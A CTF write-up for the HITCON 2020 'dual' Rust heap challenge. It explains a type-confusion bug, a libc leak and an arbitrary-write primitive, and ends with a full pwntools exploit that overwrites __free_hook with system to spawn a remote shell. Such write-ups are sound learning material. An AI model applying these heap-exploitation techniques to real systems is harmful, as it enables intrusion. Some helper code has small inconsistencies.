+++
title = "Hitcon 2020 dual writeup"
date = 2020-12-01
description = "Write up of the rust heap exploitation challenge of Hitcon 2020 (dual)"
+++

Writeup of the dual pwn challenge of the Hitcon 2020 CTF, I played with [mHackeroni](https://mhackeroni.it/).
> Heap exploitation in Rust? Is there any hope? Yes if you implement your own Garbage Collector.

## The program
The executable it's a simple CLI which allows to load a graph.
The binary doesn't have any hard mitigations:
```bash
$ checksec dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	ymbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   3950) Symbols	  No	0		12		dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
```

# The vulnerability
The struct of the Nodes of the Graph is:
```rust
struct Node{
    id: u64,              // 0x00 id of the node
    this_index: u64,      // 0x08 index of the current obj inside of the pool
    edges: *mut Vec<u64>, // 0x10 ptr to the vector of neighbours
    last_edge: *mut u64,  // 0x18 ptr to the last edge in the vector of neighbours
    edges_end: *mut u64,  // 0x20 ptr to the end of the vector of neighbours
    text_len: u64,        // 0x28 Len of the text
    text_index: u64,      // 0x30 Index to the text obj in the pool
    stamp: u64,           // 0x38 operation stamp (not really usefull for pwning)
}
```

After ~~fuzzing~~ playing with the binary we found out that using `write_bin` with length 0 causes a bug.

```rust
fn write_bin(){
    println!("node_id>");
    let node_id = read_int();
    let node = match find_node(root, node_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };
    
    println!("bin_len>");
    let bin_len = read_int();
    let bin_vals = read(bin_len);
    
    let (new_string, len) = encode(bin_vals, bin_len);
    // NO CHECK!
    node.text_index = add_pool(new_string);
    node.text_len = len;
}

fn encode(bin_vals, bin_len) -> (&str, u64){
    if bin_len == 0 {
        // NULL == 0
        return (NULL, 1);
    }
    ...
}

```
(Here we skip over a lot of details which are not relevant here.)
Basically the `write_bin` function always add to the pool even if the encoding fails.
The garbage collector considers a cell free if its `value >> 3 == 0` and this olds for NULL. Therefore we have a type confusion where we can have the same memory referenced as a text and a node.

![](/hitcon_2020_dual.png)

Now we can study the [Rust documentation](https://doc.rust-lang.org/reference/type-layout.html) to figure out how to forge the `Node` data structure.
But [Rust does not guarantees that the fields order is respected](https://doc.rust-lang.org/reference/type-layout.html#the-default-representation) on structs without `#[repr(C)]`, so the fields order
might change between different compiler versions.
```python
def craft_node(_id, **kwargs):
    """Helper function to get the bytes of an arbitrary node"""
    s  = p64(_id)
    s += p64(kwargs.get("this_idx", 0x4141414141414141)
    s += p64(kwargs.get("edges", 0)
    s += p64(kwargs.get("last_edge", 0)
    s += p64(kwargs.get("edges_end", 0)
    s += p64(kwargs.get("text_len", 0x4141414141414141)
    s += p64(kwargs.get("text_idx", 0x4141414141414141)
    s += p64(kwargs.get("stamp",0x4141414141414141 )
    return s
    
def forge_node(**kwargs):
    # write an empty b64 to cause the bug in the node 0
    write_bin(0, "")
    # Create a new node which will be confused
    # with the text of the node 0
    node_id = create(0)
    # Create the bytes for the arbitrary node
    crafted = craft(node_id, **kwargs)
    # Write it 
    write_text(0, crafted)
    return node_id
```

Now that we can forge arbitrary nodes we need to find a leak of the libc address and a write primitive.

The pseudo-rust of the connect_node function is:
```rust
fn connect_node() {
    println!("pred_id>");
    let pred_id = read_int();
    
    let pred_node = match find_node(root, pred_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };
    
    println!("succ_id>");
    let succ_id = read_int();
    let succ_node = match find_node(root, succ_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };
    
    unsafe{
        let mut ptr = pred_node.edges;
        // check if the edge was already inserted
        while ptr < pred_node.last_edge {
            if pool[*ptr] == succ {
                return;
            }
        }
        
        if pred_node.last_edge != pred_node.edges_end {
            // realloc pred_node.edges
            // and fix pred_node.last_edge
            // and pred_node.edges_end
        } 
        
        // write what where primitive
        *pred_node.last_edge = succ_node.this_index;
    }
}
```
So if we can craft two arbitrary nodes, we can use `connect_node` to get arbitrary write. 

For the libc leak we can do the usual unsorted bin leak (free a chunk into the unsorted bin, then read the pointer to the arena that will be placed in the heap).
Here we create a node with arbitrary big `text_len` to be able to read out of bound, then allocate and free a chunk to read the heap-metadata of the freed chunk.
```python
nb = create(0)
# Bug: write_bin with size 0 will return 1 instead of a pointer.
write_bin(nb, '')
# This node can be overwritten with nb.text.
n1 = create(nb)
# Node that will be freed for the libc leak.
n2 = create(nb)
# Allocate >0x400 bytes so that the chunk will skip the tcache.
write_text(n2, 'X'*0x500)
# Create another node to avoid consolidation with the top chunk.
n3 = create(nb)
# Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
disconnect(nb, n2)
gc()
# Craft n1 so that we can read the pointers from the heap.
crafted = craft(n1, text_idx=n1, text_len=0x100)
write_text(nb, crafted)
# Leak.
leak = read(n1)
```

# The exploit
In the following code we will omit the primitives for simplicity sake, the complete script can be found [here](https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab).

Now that we can leak a libc address and we have a write-what-where primitive we can open a shell by either modifying the `.got.plt` or by overwriting one of the hooks in the libc.
We chose to overwrite the `__free_hook` since it's faster.

Steps to get a shell:
 - get the leak
 - craft the nodes for the arbitrary write
 - write the address of `system` in `__free_hook`
 - create a text with `/bin/sh\x00` and then free it

The full exploit:
```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
host = '13.231.226.137'
port = 9573

p = remote(host, port)

# Step 1: leak libc base.
# Prepare a root node for later. In the second step the DFS will go down here first,
# so it won't crash on the nodes we crafted in the first step.
na = create(0)
# Root node for step 1.
nb = create(0)
# Bug: write_bin with size 0 will return 1 instead of a pointer.
write_bin(nb, '')
# This node can be overwritten with nb.text.
n1 = create(nb)
# Node that will be freed for the libc leak.
n2 = create(nb)
# Allocate >0x400 bytes so that the chunk will skip the tcache.
write_text(n2, 'X'*0x500)
# Create another node to avoid consolidation with the top chunk.
n3 = create(nb)
# Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
disconnect(nb, n2)
gc()
# Craft n1 so that we can read the pointers from the heap.
crafted = craft(n1, text_idx=n1, text_len=0x100)
print('writing', len(crafted), 'bytes:', crafted)
write_text(nb, crafted)
leak = read(n1)
print(leak)
leak_libc = u64(leak[160:160+8])
print('leak arena:', hex(leak_libc))
leak_offset = 2014176 # main_arena + 96
main_arena = 0x7ffff7c2cb80 # libc.symbols['main_arena']
print('main_arena', hex(main_arena))
print('leak_offset', hex(leak_offset))
libc_base = leak_libc - leak_offset
print('libc base:', hex(libc_base))
pause()

# Step 2: write what-were to get a shell.
libc.address = libc_base
system = libc.symbols['system']
what = system
print('system:', hex(system))
free_hook = libc.symbols['__free_hook']
where = free_hook
print('__free_hook:', hex(free_hook))
# write_bin bug again to control a second node.
write_bin(n3, '')
# This node can be overwritten with n3.text.
n4 = create(na)
# Prepare nodes for arbitrary write.
wherenode = craft(n1, edges=where-8, last_edge=where, edges_end=where+32)
whatnode = craft(n4, pool_idx=what)
write_text(n3, whatnode)
write_text(nb, wherenode)
# Trigger arbitrary write.
connect(n1, n4)
pause()

# Write in a chunk and trigger the free in write_text to call system("/bin/sh").
write_text(nb, b'/bin/sh\x00')
write_text(nb, 'A'*1500, shell=True)
p.interactive()
```